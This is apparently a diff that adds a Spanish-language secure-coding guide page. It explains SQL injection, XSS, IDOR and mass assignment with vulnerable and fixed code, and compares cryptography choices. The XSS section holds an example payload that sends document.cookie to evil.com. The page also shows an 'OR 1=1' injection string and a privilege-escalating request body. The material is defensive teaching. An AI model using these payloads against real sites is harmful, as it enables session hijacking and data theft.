@@ -1,0 +1,172 @@
+<p>La seguridad no es responsabilidad exclusiva de un equipo de seguridad. Es una propiedad del
+código que
+cada ingeniero escribe todos los días. Los vulnerabilidades más costosas de la historia no
+fueron ataques
+sofisticados — fueron errores básicos de validación de input, configuración incorrecta, o
+confianza
+implícita en datos externos.</p>
+
+<h3 id="owasp">OWASP Top 10: Los Bugs que Más Importan</h3>
+
+<h4>1. SQL INJECTION: AÚN EL MÁS COMÚN Y EL MÁS EVITABLE</h4>
+<pre data-lang="python"><code><span class="cm"># ❌ SQL Injection — un bug que destruyó empresas enteras</span>
+user_input = request.GET.get(<span class="str">'user_id'</span>)  <span class="cm"># "1 OR 1=1 --"</span>
+query = f<span class="str">"SELECT * FROM users WHERE id = {user_input}"</span>
+<span class="cm"># Resultado: SELECT * FROM users WHERE id = 1 OR 1=1 --
+# Retorna TODOS los usuarios. Con DROP TABLE: elimina la BD.</span>
+
+<span class="cm"># ✓ Parameterized queries — siempre, sin excepción</span>
+user_id = request.GET.get(<span class="str">'user_id'</span>)
+user = db.<span class="fn">fetchone</span>(<span class="str">"SELECT * FROM users WHERE id = %s"</span>, (user_id,))
+<span class="cm"># El driver de BD escapa el parámetro automáticamente
+# La query y los datos nunca se concatenan como strings</span>
+
+<span class="cm"># ✓ ORM: parameterized por diseño</span>
+user = User.objects.<span class="fn">get</span>(id=user_id)  <span class="cm"># Django — nunca inyectable</span>
+user = session.<span class="fn">query</span>(User).<span class="fn">filter</span>(User.id == user_id).<span class="fn">first</span>()  <span class="cm"># SQLAlchemy</span>
+
+<span class="cm"># Cuándo puede fallar incluso con ORM:
+# raw() queries, execute() con f-strings, order_by() con input del usuario</span>
+<span class="cm"># ❌ User.objects.raw(f"SELECT * FROM users ORDER BY {sort_field}")</span>
+<span class="cm"># ✓  allowlist = ['name', 'email', 'created_at']
+#    if sort_field not in allowlist: raise ValueError
+#    User.objects.order_by(sort_field)</span></code></pre>
+
+<h4>2. XSS: CROSS-SITE SCRIPTING</h4>
+<pre data-lang="typescript"><code><span class="cm">// ❌ XSS Reflejado: input del usuario insertado sin escapar en HTML</span>
+<span class="cm">// URL: /search?q=&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</span>
+<span class="kw">const</span> query = new URLSearchParams(window.location.search).get(<span class="str">'q'</span>)
+document.getElementById(<span class="str">'results'</span>).innerHTML = <span class="str">`Results for: ${query}`</span>
+<span class="cm">// El script se ejecuta en el navegador de la víctima
+// Roba cookies, sessionStorage, LocalStorage, puede hacer requests como el usuario</span>
+
+<span class="cm">// ✓ Escapar siempre el contenido dinámico</span>
+<span class="kw">function</span> <span class="fn">escapeHtml</span>(text: string): string {
+  <span class="kw">const</span> div = document.<span class="fn">createElement</span>(<span class="str">'div'</span>)
+  div.textContent = text   <span class="cm">// textContent escapa automáticamente</span>
+  <span class="kw">return</span> div.innerHTML
+}
+<span class="cm">// Mejor: usar frameworks (React, Vue, Angular) que escapan por defecto
+// dangerouslySetInnerHTML en React es la señal de alarma — nunca con input de usuario</span>
+
+<span class="cm">// ✓ Content Security Policy: el seguro adicional</span>
+<span class="cm">// Header HTTP que define de dónde puede cargar scripts el navegador:</span>
+<span class="cm">// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
+// Aunque el XSS se inyecte, el browser lo bloquea si no viene de la allowlist</span></code></pre>
+
+<h4>3. INSECURE DIRECT OBJECT REFERENCE (IDOR)</h4>
+<pre
+                        data-lang="python"><code><span class="cm"># El bug de autorización más común — y el más fácil de introducir</span>
+
+<span class="cm"># ❌ IDOR: cualquier usuario puede acceder a cualquier orden</span>
+<span class="k2">@app.get</span>(<span class="str">"/orders/{order_id}"</span>)
+<span class="kw">async def</span> <span class="fn">get_order</span>(order_id: int, current_user: User = Depends()):
+    order = <span class="kw">await</span> Order.get(order_id)  <span class="cm"># Falta verificar ownership!</span>
+    <span class="kw">return</span> order
+<span class="cm"># GET /orders/12345 → devuelve la orden 12345 aunque sea de otro usuario
+# El atacante itera IDs: /orders/1, /orders/2, /orders/3...</span>
+
+<span class="cm"># ✓ Siempre filtrar por el usuario autenticado</span>
+<span class="k2">@app.get</span>(<span class="str">"/orders/{order_id}"</span>)
+<span class="kw">async def</span> <span class="fn">get_order</span>(order_id: int, current_user: User = Depends()):
+    order = <span class="kw">await</span> Order.<span class="fn">get</span>(id=order_id, user_id=current_user.id)
+    <span class="kw">if not</span> order:
+        <span class="kw">raise</span> HTTPException(status_code=<span class="nm">404</span>)  <span class="cm"># 404, no 403 — no revelar existencia</span>
+    <span class="kw">return</span> order
+
+<span class="cm"># ✓ Para admins que SÍ pueden ver cualquier orden: verificar el rol explícitamente</span>
+<span class="k2">@app.get</span>(<span class="str">"/admin/orders/{order_id}"</span>)
+<span class="k2">@require_role</span>(<span class="str">"admin"</span>)
+<span class="kw">async def</span> <span class="fn">admin_get_order</span>(order_id: int, current_user: User = Depends()):
+    <span class="kw">return await</span> Order.<span class="fn">get</span>(order_id)  <span class="cm"># Admin puede ver cualquier orden</span></code></pre>
+
+<h4>4. MASS ASSIGNMENT: EL BUG QUE COMPROMETIÓ GITHUB</h4>
+<pre
+                        data-lang="python"><code><span class="cm"># Mass assignment: el atacante envía campos que no debería poder modificar</span>
+
+<span class="cm"># ❌ Mass assignment: aceptar todo el body directamente</span>
+<span class="k2">@app.put</span>(<span class="str">"/users/me"</span>)
+<span class="kw">async def</span> <span class="fn">update_profile</span>(body: dict, current_user: User = Depends()):
+    <span class="kw">await</span> user_repo.<span class="fn">update</span>(current_user.id, **body)
+<span class="cm"># Un atacante envía: {"name": "John", "is_admin": true, "credits": 99999}
+# El ORM actualiza todos esos campos sin discriminación</span>
+
+<span class="cm"># ✓ Explicit DTOs: solo los campos permitidos pueden cambiar</span>
+<span class="kw">from</span> pydantic <span class="kw">import</span> BaseModel
+
+<span class="kw">class</span> <span class="fn">UpdateProfileDTO</span>(BaseModel):
+    name: str | None = None
+    bio: str | None = None
+    avatar_url: str | None = None
+    <span class="cm"># is_admin, credits, role → no están en el DTO → imposible modificarlos</span>
+
+<span class="k2">@app.put</span>(<span class="str">"/users/me"</span>)
+<span class="kw">async def</span> <span class="fn">update_profile</span>(body: UpdateProfileDTO, current_user: User = Depends()):
+    <span class="kw">await</span> user_repo.<span class="fn">update</span>(current_user.id, body.<span class="fn">model_dump</span>(exclude_unset=<span class="kw">True</span>))</code></pre>
+
+<h3 id="crypto">Cryptography Práctica: Cuándo Usar Qué</h3>
+
+<div class="table-wrap">
+<table>
+<thead>
+<tr>
+<th>Necesidad</th>
+<th>Solución correcta</th>
+<th>Solución incorrecta</th>
+<th>Por qué importa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Almacenar contraseñas</td>
+<td class="g">bcrypt, argon2, scrypt</td>
+<td class="r">MD5, SHA-1, SHA-256, cifrado reversible</td>
+<td>bcrypt tiene trabajo configurable — lento por diseño para fuerza bruta</td>
+</tr>
+<tr>
+<td>Comparar contraseñas/tokens</td>
+<td class="g">hmac.compare_digest() o equivalente</td>
+<td class="r">== o strcmp directo</td>
+<td>Comparación directa es vulnerable a timing attacks</td>
+</tr>
+<tr>
+<td>Generar tokens seguros</td>
+<td class="g">secrets.token_urlsafe() (Python), crypto.randomBytes() (Node)</td>
+<td class="r">Math.random(), uuid v4 sin crypto</td>
+<td>Math.random() es predecible — no es criptográficamente seguro</td>
+</tr>
+<tr>
+<td>Cifrar datos en tránsito</td>
+<td class="g">TLS 1.2+ (configurado correctamente)</td>
+<td class="r">TLS 1.0, SSL, cipher suites débiles</td>
+<td>Versiones antiguas tienen vulnerabilidades conocidas</td>
+</tr>
+<tr>
+<td>Cifrar datos en reposo</td>
+<td class="g">AES-256-GCM (cifrado autenticado)</td>
+<td class="r">AES-ECB, DES, cifrado sin autenticación</td>
+<td>AES-ECB revela patrones en los datos. Sin autenticación: modificable sin
+detección</td>
+</tr>
+<tr>
+<td>Firmar datos (JWT, webhooks)</td>
+<td class="g">HMAC-SHA256 con clave secreta, RS256 con par de claves</td>
+<td class="r">Algoritmo "none", MD5</td>
+<td>alg:none es una vulnerabilidad clásica de JWT</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<div class="arch-rel">
+<span class="arch-rel-lbl">Conexión técnica</span>
+<p>La seguridad aplicada a nivel de código implementa los principios del modelo <strong>Zero
+Trust</strong>
+arquitectónico: validar cada input (nunca confiar en datos externos), autorización explícita
+en cada
+endpoint (IDOR), y mínimo privilegio (DTOs explícitos, no mass assignment). Las
+vulnerabilidades de
+seguridad no son problemas de arquitectura — son problemas de implementación que ninguna
+arquitectura
+puede prevenir por sí sola.</p>
+</div>
